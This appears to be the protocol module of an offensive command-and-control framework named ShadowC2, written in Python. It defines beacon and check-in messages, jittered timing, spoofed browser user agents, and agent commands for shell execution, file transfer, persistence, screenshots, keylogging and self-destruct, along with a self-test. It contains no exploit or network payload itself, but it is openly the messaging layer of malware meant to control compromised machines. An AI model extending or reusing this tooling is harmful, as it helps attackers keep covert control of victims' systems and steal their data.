"""
ShadowC2 - Protocol Module
Defines the C2 communication protocol, message formats, and constants
"""

import json
import time
import uuid
from enum import Enum
from typing import Dict, Any, Optional


class MessageType(Enum):
    """C2 Message Types"""
    # Agent -> Server
    CHECKIN = "checkin"              # Initial registration
    HEARTBEAT = "heartbeat"          # Keep-alive beacon
    RESPONSE = "response"            # Command response
    ERROR = "error"                  # Error message
    
    # Server -> Agent
    COMMAND = "command"              # Execute command
    FILE_UPLOAD = "file_upload"      # Upload file to agent
    FILE_DOWNLOAD = "file_download"  # Download file from agent
    SLEEP = "sleep"                  # Change beacon interval
    EXIT = "exit"                    # Terminate agent
    PERSIST = "persist"              # Install persistence
    REMOVE = "remove"                # Remove persistence
    SYSINFO = "sysinfo"              # Get system information


class CommandType(Enum):
    """Agent Command Types"""
    SHELL = "shell"                  # Execute shell command
    DOWNLOAD = "download"            # Download file from agent
    UPLOAD = "upload"                # Upload file to agent
    LS = "ls"                        # List directory
    CD = "cd"                        # Change directory
    PWD = "pwd"                      # Print working directory
    WHOAMI = "whoami"                # Current user
    HOSTNAME = "hostname"            # Get hostname
    SYSINFO = "sysinfo"              # System information
    SLEEP = "sleep"                  # Set beacon interval
    JITTER = "jitter"                # Set beacon jitter
    PERSIST = "persist"              # Install persistence
    REMOVE_PERSIST = "remove_persist" # Remove persistence
    SCREENSHOT = "screenshot"        # Capture screenshot
    KEYLOG_START = "keylog_start"    # Start keylogger
    KEYLOG_STOP = "keylog_stop"      # Stop keylogger
    KILLSWITCH = "killswitch"        # Self-destruct


class C2Message:
    """
    Base C2 message format
    
    Standard message structure:
    {
        "msg_id": "unique-message-id",
        "msg_type": "checkin|heartbeat|command|response|error",
        "session_id": "agent-session-id",
        "timestamp": 1234567890,
        "data": { ... }
    }
    """
    
    def __init__(
        self, 
        msg_type: MessageType, 
        session_id: str, 
        data: Optional[Dict[str, Any]] = None,
        msg_id: Optional[str] = None
    ):
        """
        Create a new C2 message
        
        Args:
            msg_type: Type of message (from MessageType enum)
            session_id: Agent session identifier
            data: Message payload data
            msg_id: Optional message ID (generated if not provided)
        """
        self.msg_id = msg_id or str(uuid.uuid4())
        self.msg_type = msg_type.value if isinstance(msg_type, MessageType) else msg_type
        self.session_id = session_id
        self.timestamp = int(time.time())
        self.data = data or {}
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert message to dictionary"""
        return {
            "msg_id": self.msg_id,
            "msg_type": self.msg_type,
            "session_id": self.session_id,
            "timestamp": self.timestamp,
            "data": self.data
        }
    
    def to_json(self) -> str:
        """Convert message to JSON string"""
        return json.dumps(self.to_dict())
    
    @staticmethod
    def from_dict(data: Dict[str, Any]) -> 'C2Message':
        """Create message from dictionary"""
        msg = C2Message(
            msg_type=data.get("msg_type", "unknown"),
            session_id=data.get("session_id", ""),
            data=data.get("data", {}),
            msg_id=data.get("msg_id")
        )
        msg.timestamp = data.get("timestamp", int(time.time()))
        return msg
    
    @staticmethod
    def from_json(json_str: str) -> 'C2Message':
        """Create message from JSON string"""
        data = json.loads(json_str)
        return C2Message.from_dict(data)


class CheckinMessage(C2Message):
    """
    Agent check-in message (initial registration)
    
    Data format:
    {
        "hostname": "DESKTOP-ABC123",
        "username": "Administrator",
        "os": "Windows 10 Pro",
        "architecture": "x64",
        "ip_address": "192.168.1.100",
        "mac_address": "00:0C:29:XX:XX:XX",
        "domain": "WORKGROUP",
        "privileges": "admin",
        "agent_version": "1.0.0"
    }
    """
    
    def __init__(self, session_id: str, system_info: Dict[str, str]):
        """
        Create check-in message
        
        Args:
            session_id: Unique session identifier
            system_info: Dictionary with system information
        """
        super().__init__(
            msg_type=MessageType.CHECKIN,
            session_id=session_id,
            data=system_info
        )


class HeartbeatMessage(C2Message):
    """
    Agent heartbeat/beacon message
    
    Data format:
    {
        "uptime": 3600,  # seconds
        "cpu_usage": 45.2,  # percentage
        "memory_usage": 60.5,  # percentage
        "processes": 120  # number of processes
    }
    """
    
    def __init__(self, session_id: str, stats: Optional[Dict[str, Any]] = None):
        """
        Create heartbeat message
        
        Args:
            session_id: Session identifier
            stats: Optional system statistics
        """
        super().__init__(
            msg_type=MessageType.HEARTBEAT,
            session_id=session_id,
            data=stats or {}
        )


class CommandMessage(C2Message):
    """
    Command message from server to agent
    
    Data format:
    {
        "command": "shell",
        "args": ["whoami"],
        "options": {}
    }
    """
    
    def __init__(
        self, 
        session_id: str, 
        command: str, 
        args: Optional[list] = None,
        options: Optional[Dict[str, Any]] = None
    ):
        """
        Create command message
        
        Args:
            session_id: Target session
            command: Command to execute
            args: Command arguments
            options: Additional options
        """
        super().__init__(
            msg_type=MessageType.COMMAND,
            session_id=session_id,
            data={
                "command": command,
                "args": args or [],
                "options": options or {}
            }
        )


class ResponseMessage(C2Message):
    """
    Response message from agent to server
    
    Data format:
    {
        "command_id": "original-command-msg-id",
        "success": true,
        "output": "command output here",
        "error": null
    }
    """
    
    def __init__(
        self,
        session_id: str,
        command_id: str,
        success: bool,
        output: str = "",
        error: Optional[str] = None
    ):
        """
        Create response message
        
        Args:
            session_id: Session identifier
            command_id: ID of command being responded to
            success: Whether command succeeded
            output: Command output
            error: Error message if failed
        """
        super().__init__(
            msg_type=MessageType.RESPONSE,
            session_id=session_id,
            data={
                "command_id": command_id,
                "success": success,
                "output": output,
                "error": error
            }
        )


class ErrorMessage(C2Message):
    """
    Error message
    
    Data format:
    {
        "error_type": "CommandExecutionError",
        "error_message": "Failed to execute command",
        "traceback": "..."
    }
    """
    
    def __init__(
        self,
        session_id: str,
        error_type: str,
        error_message: str,
        traceback: Optional[str] = None
    ):
        """
        Create error message
        
        Args:
            session_id: Session identifier
            error_type: Type of error
            error_message: Error description
            traceback: Optional stack trace
        """
        super().__init__(
            msg_type=MessageType.ERROR,
            session_id=session_id,
            data={
                "error_type": error_type,
                "error_message": error_message,
                "traceback": traceback
            }
        )


# Protocol Constants
class ProtocolConfig:
    """C2 Protocol Configuration"""
    
    # Version
    PROTOCOL_VERSION = "1.0"
    
    # Timing (seconds)
    DEFAULT_BEACON_INTERVAL = 60  # 60 seconds
    DEFAULT_JITTER = 30           # ±30 seconds
    MIN_BEACON_INTERVAL = 5       # Minimum 5 seconds
    MAX_BEACON_INTERVAL = 3600    # Maximum 1 hour
    
    # HTTP Configuration
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    
    # API Endpoints
    ENDPOINT_CHECKIN = "/api/v1/checkin"
    ENDPOINT_BEACON = "/api/v1/beacon"
    ENDPOINT_RESPONSE = "/api/v1/response"
    ENDPOINT_ERROR = "/api/v1/error"
    
    # Limits
    MAX_MESSAGE_SIZE = 10 * 1024 * 1024  # 10 MB
    MAX_FILE_SIZE = 100 * 1024 * 1024    # 100 MB
    
    # Retry Configuration
    MAX_RETRIES = 3
    RETRY_DELAY = 5  # seconds


# Message validation
def validate_message(msg_dict: Dict[str, Any]) -> bool:
    """
    Validate C2 message structure
    
    Args:
        msg_dict: Message dictionary
        
    Returns:
        bool: True if valid, False otherwise
    """
    required_fields = ["msg_id", "msg_type", "session_id", "timestamp", "data"]
    
    # Check required fields
    for field in required_fields:
        if field not in msg_dict:
            return False
    
    # Validate msg_type
    valid_types = [t.value for t in MessageType]
    if msg_dict["msg_type"] not in valid_types:
        return False
    
    # Validate timestamp
    if not isinstance(msg_dict["timestamp"], int):
        return False
    
    # Validate data is dict
    if not isinstance(msg_dict["data"], dict):
        return False
    
    return True


# Example usage and testing
if __name__ == "__main__":
    print("[*] ShadowC2 Protocol Module Test\n")
    
    # Test CheckinMessage
    print("[+] Testing CheckinMessage...")
    checkin = CheckinMessage(
        session_id="test-session-001",
        system_info={
            "hostname": "DESKTOP-TEST",
            "username": "testuser",
            "os": "Windows 10",
            "architecture": "x64"
        }
    )
    print(f"    Message: {checkin.to_json()}")
    print("    ✓ CheckinMessage created")
    
    # Test CommandMessage
    print("\n[+] Testing CommandMessage...")
    cmd = CommandMessage(
        session_id="test-session-001",
        command="shell",
        args=["whoami"]
    )
    print(f"    Message: {cmd.to_json()}")
    print("    ✓ CommandMessage created")
    
    # Test ResponseMessage
    print("\n[+] Testing ResponseMessage...")
    response = ResponseMessage(
        session_id="test-session-001",
        command_id=cmd.msg_id,
        success=True,
        output="nt authority\\system"
    )
    print(f"    Message: {response.to_json()}")
    print("    ✓ ResponseMessage created")
    
    # Test message validation
    print("\n[+] Testing message validation...")
    valid_msg = checkin.to_dict()
    invalid_msg = {"invalid": "message"}
    
    assert validate_message(valid_msg), "Valid message failed validation"
    assert not validate_message(invalid_msg), "Invalid message passed validation"
    print("    ✓ Validation working correctly")
    
    # Test serialization/deserialization
    print("\n[+] Testing serialization...")
    original = cmd.to_dict()
    json_str = cmd.to_json()
    restored = C2Message.from_json(json_str)
    
    assert original["msg_id"] == restored.msg_id, "msg_id mismatch"
    assert original["msg_type"] == restored.msg_type, "msg_type mismatch"
    assert original["session_id"] == restored.session_id, "session_id mismatch"
    print("    ✓ Serialization/deserialization working")
    
    print("\n[*] All tests passed successfully!")
